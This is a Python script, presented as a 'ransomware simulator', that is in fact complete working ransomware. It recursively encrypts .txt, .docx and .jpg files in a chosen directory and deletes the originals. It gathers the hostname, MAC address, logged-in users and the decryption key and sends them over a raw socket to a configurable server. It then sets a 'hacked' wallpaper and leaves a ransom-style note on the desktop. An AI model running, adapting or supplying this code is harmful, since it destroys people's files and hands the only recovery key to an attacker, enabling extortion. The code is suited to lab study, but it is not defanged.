import gc
import os
import json
import uuid
import ctypes
import socket
import subprocess
from cryptography.fernet import Fernet

class RansomwareSimulator:
    def __init__(self, directory, server_host, server_port, file_extensions):
        self.directory = directory
        self.server_host = server_host
        self.server_port = server_port
        self.file_extensions = file_extensions
        self.key = Fernet.generate_key()

    def change_wallpaper(self, image_path):
        if os.name == 'nt':  # Windows
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
        else:  # Linux
            desktop_env = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()
            try:
                if 'gnome' in desktop_env:  # GNOME desktop
                    subprocess.run([
                        'gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f"file://{image_path}"
                    ], check=True)
                else:
                    print("Wallpaper change feature is not supported on this OS.")
            except Exception as e:
                print(f"Failed to change wallpaper: {e}")
            

    def get_mac_address(self):
        mac_num = hex(uuid.getnode()).replace('0x', '').upper()
        mac_num = mac_num.zfill(12)
        mac = ':'.join(mac_num[i: i + 2] for i in range(0, 12, 2))
        return mac


    def create_readme(self):
        desktop_path = os.path.join(os.environ['HOME'], 'Desktop') #Linux
        #desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') #Windows
        readme_path = os.path.join(desktop_path, 'Readme.txt')
        with open(readme_path, 'w') as file:
            file.write("Ur files are encrypted :( Should have used Ransomware Defender (Simulation)")


    def encrypt_file(self, file_path):
        fernet = Fernet(self.key)
        with open(file_path, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)

        encrypted_file_path = file_path + ".denizhalil"
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        os.remove(file_path)
        return encrypted_file_path

    def find_and_encrypt_files(self):
        encrypted_files = []
        for root, _, files in os.walk(self.directory):
            for file in files:
                if any(file.endswith(ext) for ext in self.file_extensions):
                    file_path = os.path.join(root, file)
                    encrypted_file_path = self.encrypt_file(file_path)
                    encrypted_files.append(encrypted_file_path)
                    print(f"Encrypted and saved file: {encrypted_file_path}")
        return encrypted_files

    def get_active_users(self):
        try:
            command = 'query user' if os.name == 'nt' else 'who'
            output = subprocess.check_output(command, shell=True)
            return output.decode(errors='ignore')
        except subprocess.CalledProcessError:
            return "Unable to fetch active users"

    def collect_data(self):
        return {
            'hostname': socket.gethostname(),
            'key': self.key.decode(),
            'active_users': self.get_active_users(),
            'mac_address': self.get_mac_address()
        }

    def send_data_to_server(self):
        data = self.collect_data()
        self.send_to_server(json.dumps(data))

    def send_to_server(self, data):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server_host, self.server_port))
                s.sendall(data.encode())
        except:
            quit(0)

    def clear_memory(self):
        gc.collect()
        print("Memory cleared.")

def main():
    file_extensions = ['.txt', '.docx', '.jpg']
    directory = 'rw_target/'  #should be replaced with the directory path you want to target
    wallpaper_path = r"img/hacked.jpg" #May require full path
    server_host = '127.0.0.1'
    #server_host = '10.0.2.37' #Original
    server_port = 12345




    simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)
    simulator.find_and_encrypt_files()
    simulator.send_data_to_server()
    simulator.change_wallpaper(wallpaper_path)  # Change the wallpaper
    simulator.create_readme()
    simulator.clear_memory()

if __name__ == "__main__":
    main()
